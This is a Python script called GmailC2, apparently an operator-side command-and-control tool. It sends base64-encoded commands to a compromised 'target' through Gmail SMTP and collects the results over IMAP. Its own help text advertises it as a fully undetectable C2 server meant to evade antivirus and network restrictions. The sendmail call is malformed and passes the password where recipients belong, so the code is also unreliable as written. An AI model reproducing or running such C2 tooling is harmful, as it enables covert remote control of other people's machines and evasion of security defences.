import base64
import email
import imaplib
import os
import smtplib
import subprocess
import time
import argparse


def usage():
    return """
    python3 gmailc2.py --first-gmail <1st_gmail@gmail.com> --paswword <1st_gmail_password> --second-gmail <2nd_gmail@gmail.com> 
    """


def create_parser():
    parser = argparse.ArgumentParser(description='GmailC2 - by Machine1337', epilog='A Fully Undetectable C2 Server '
                                                                                    'That Communicates Via Google '
                                                                                    'SMTP to evade Antivirus '
                                                                                    'Protections and Network Traffic '
                                                                                    'Restrictions', usage=usage())
    parser.add_argument('--first-gmail', help='1st gmail account', metavar='first_gmail', required=True)
    parser.add_argument('--second-gmail', help='2nd gmail account', metavar='second_gmail', required=True)
    parser.add_argument('-p', '--password', help='1st gmail account password', required=True)
    return parser


smtpserver = "smtp.gmail.com"
imapserver = "imap.gmail.com"
_parser = create_parser()
args = _parser.parse_args()


requirements = ['termcolor', 'pystyle', 'colorama']
print(f"[*] Checking {len(requirements)} required modules ({requirements})...")
try:
    import colorama
    import termcolor
    from pystyle import *
    from colorama import Fore, Back, Style
    print(f"[+] Requirements satisfied.")
except ImportError:
    # Iterate over each item in the requirements list, and install each found item
    for module in requirements:
        subprocess.run(['pip3', 'install', module], shell=False)
    import colorama
    import termcolor
    from pystyle import *
    from colorama import Fore, Back, Style


def ascii_banner():
    colorama.deinit()
    return Center.XCenter("""
*********************++++++++++++++++++*******************************
*     ______ __  __    _    ___ _          ____      _  _______       *
+    / / ___|  \/  |  / \  |_ _| |        |  _ \    / \|_   _\ \`     +
*   | | |  _| |\/| | / _ \  | || |   _____| |_) |  / _ \ | |  | |     *
+  < <| |_| | |  | |/ ___ \ | || |__|_____|  _ <  / ___ \| |   > >    +
*   | |\____|_|  |_/_/   \_\___|_____|    |_| \_\/_/   \_\_|  | |     *
+    \_\                                                     /_/      +
*                                                                     *
+                   Coded By: Machine1337                             +
**************************+++++++++++++++++++++************************
                            \n\n
""")


def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Vertical(Colors.green_to_yellow, ascii_banner(), 2))
    catc()


def catc():
    try:
        send_command()
        read_result()
    except KeyboardInterrupt:
        quit(f"{Fore.YELLOW}\n[!] You Pressed The Exit Button! Now Going For sleep.{Style.RESET_ALL}")
    # Print out the cause of the error
    except Exception as err:
        print(f'{Fore.RED}\n[x] An error occurred: {err}{Style.RESET_ALL}')


def send_command():
    while True:
        command = str(input(termcolor.colored("\n[*] Enter Command [*]:- ", 'green')))
        if command in ['?', 'help']:
            print("""
        Command               Description
        -------               -----------
        ?/help                Show this help menu
        info                  Show client system information
        cd <directory_name>   Move to the specified directory
        """)
        message_bytes = command.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        server = smtplib.SMTP(smtpserver, 587)
        server.starttls()
        server.login(args.first_gmail, args.password)
        server.sendmail(args.first_gmail, args.password, args.second_gmail, base64_message)
        server.quit()
        print(f"{Fore.GREEN}\n[+] Command Sent To The Target{Style.RESET_ALL}")
        time.sleep(1)
        print(termcolor.colored("[*] Waiting For The Result (sleep 10s For Good Result)...", 'cyan'))
        time.sleep(10)
        read_result()


def read_result():
    message = imaplib.IMAP4_SSL(imapserver)
    message.login(args.first_gmail, args.password)
    message.select("inbox")
    _, data = message.search(None, "UNSEEN")

    for x in data[0].split():
        _, msg = message.fetch(x, '(RFC822)')
        _, g = msg[0]
        data_email = email.message_from_bytes(g)
        for m in data_email.walk():
            if m.get_content_type() == "text/plain":
                body = m.get_payload(decode=True)
                message = body.decode("utf-8")
                message_bytes = base64.b64decode(message + '=' * (-len(message) % 4))
                final = message_bytes.decode("utf-8", errors="replace")
                print(final)
        time.sleep(1)


logo()
